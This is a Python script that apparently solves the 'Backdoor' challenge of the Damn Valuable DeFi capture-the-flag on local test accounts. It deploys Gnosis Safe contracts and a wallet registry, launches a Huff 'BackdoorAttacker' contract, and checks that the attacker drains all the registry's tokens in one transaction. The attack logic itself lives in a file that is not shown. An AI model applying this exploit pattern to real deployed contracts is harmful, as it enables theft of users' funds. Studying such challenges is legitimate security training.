from ape import accounts, project
from eth_abi import encode
from ..utils.helper import (
    w3,
    reverts,
    deploy_huff_contract,
    ZERO_ADDRESS,
)

AMOUNT_TOKEN_DISTRIBUTED = w3.to_wei(40, "ether")


def main():
    # --- BEFORE EXPLOIT --- #
    print("\n--- Setting up scenario ---\n")

    # get accounts
    deployer = accounts.test_accounts[0]
    attacker = accounts.test_accounts[1]
    alice = accounts.test_accounts[2]
    bob = accounts.test_accounts[3]
    charlie = accounts.test_accounts[4]
    david = accounts.test_accounts[5]

    users = [alice, bob, charlie, david]

    print(
        f"\n--- \nOur players:\n⇒ Deployer: {deployer}\n⇒ Attacker: {attacker}\n⇒ Alice: {alice}"
    )
    print(f"⇒ Bob: {bob}\n⇒ Charlie: {charlie}\n⇒ David: {david}\n---\n")

    # Deploy Gnosis Safe master copy and factory contracts
    print("\n--- Deploying Gnosis Safe master copy and factory contracts ---\n")
    master_copy = project.GnosisSafe.deploy(sender=deployer)
    wallet_factory = project.GnosisSafeProxyFactory.deploy(sender=deployer)
    token = project.DamnValuableToken.deploy(sender=deployer)

    # Deploy the registry
    print("\n--- Deploying the registry ---\n")
    wallet_registry = project.WalletRegistry.deploy(
        master_copy,
        wallet_factory,
        token,
        users,
        sender=deployer,
    )
    assert wallet_registry.owner() == deployer

    # Users are registered as beneficiaries
    print("\n--- Ensuring all users are registered as Beneficiaries ---\n")
    for user in users:
        # users are registered as beneficiaries
        assert wallet_registry.beneficiaries(user)
        # user cannot add beneficiary
        with reverts():
            wallet_registry.addBeneficiary(user, sender=user)

    # Transfer tokens to be distributed to the registry
    token.transfer(wallet_registry, AMOUNT_TOKEN_DISTRIBUTED, sender=deployer)

    # define initial balances for attacker and wallet
    wallet_initial_bal = token.balanceOf(wallet_registry) / 10**18
    attacker_initial_bal = token.balanceOf(attacker) / 10**18

    print(
        f"\n--- \nInitial Balances:\n⇒ Wallet: {wallet_initial_bal}\n⇒ Attacker: {attacker_initial_bal}\n---\n"
    )

    # --- EXPLOIT GOES HERE --- #
    print("\n--- Initiating exploit... ---\n")

    # exploit
    deploy_huff_contract(
        "BackdoorAttacker.huff",
        encode(
            [
                "address",
                "address",
                "address",
                "address",
                "address[]",
            ],
            [
                wallet_factory.address,
                master_copy.address,
                wallet_registry.address,
                token.address,
                [user.address for user in users],
            ],
        ),
        attacker,
    )

    # --- AFTER EXPLOIT --- #
    print(
        "\n--- After exploit: Attacker should have stolen all the tokens from the wallet ---\n"
    )

    # define ending balances for attacker and wallet
    wallet_ending_bal = token.balanceOf(wallet_registry) / 10**18
    attacker_ending_bal = token.balanceOf(attacker) / 10**18

    print(
        f"\n--- \nEnding Balances:\n⇒ Wallet: {wallet_ending_bal}\n⇒ Attacker: {attacker_ending_bal}\n---\n"
    )

    # attacker must have used a single transaction
    assert attacker.nonce == 1

    for user in users:
        wallet = wallet_registry.wallets(user)

        # user must have a registered wallet
        assert wallet != ZERO_ADDRESS

        # user is no longer registered as a beneficiary
        assert not wallet_registry.beneficiaries(user)

    # attacker own all tokens
    assert token.balanceOf(attacker) == AMOUNT_TOKEN_DISTRIBUTED

    print("\n--- 🥂 Challenge Completed! 🥂---\n")


if __name__ == "__main__":
    main()
